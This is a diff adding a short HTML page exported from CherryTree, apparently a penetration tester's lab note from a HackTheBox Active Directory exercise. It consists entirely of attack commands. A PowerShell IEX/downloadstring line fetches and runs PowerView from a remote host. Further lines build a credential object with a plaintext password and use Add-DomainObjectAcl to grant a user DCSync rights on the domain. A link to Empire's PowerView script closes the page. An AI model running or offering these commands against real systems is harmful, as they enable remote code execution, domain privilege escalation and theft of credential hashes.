@@ -1,0 +1,8 @@
+<!doctype html><html>
+    <head>
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <title>powerview</title>
+      <meta name="generator" content="CherryTree">
+      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+    </head>
+    <body><div class='page'><h1 class='title'>powerview</h1><br/>IEX(New-object net.webclient).downloadstring(&#39;http://10.10.14.60:8080/PV.ps1&#39;)                      &lt;&lt;At the bottom is the link to this old powerview.<br />$pass = convertto-securestring ‘YeeYeeYee’ -AsPlainText -Force<br />$cred = new-object system.management.automation.pscredential(&#39;htb\squid&#39;, $pass)<br />Add-DomainObjectAcl -credential $cred -targetidentity &quot;DC=htb,DC=local&quot; -PrincipalIdentity squid -rights DCSync<br /><br /><br /><br /><br /><br /><br />VVVVVVVVVOnly Old PowerView is Functional With Bloodhound!!!!!!VVVVVVVVV<br /><a href="https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1">https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1</a></div></body></html>
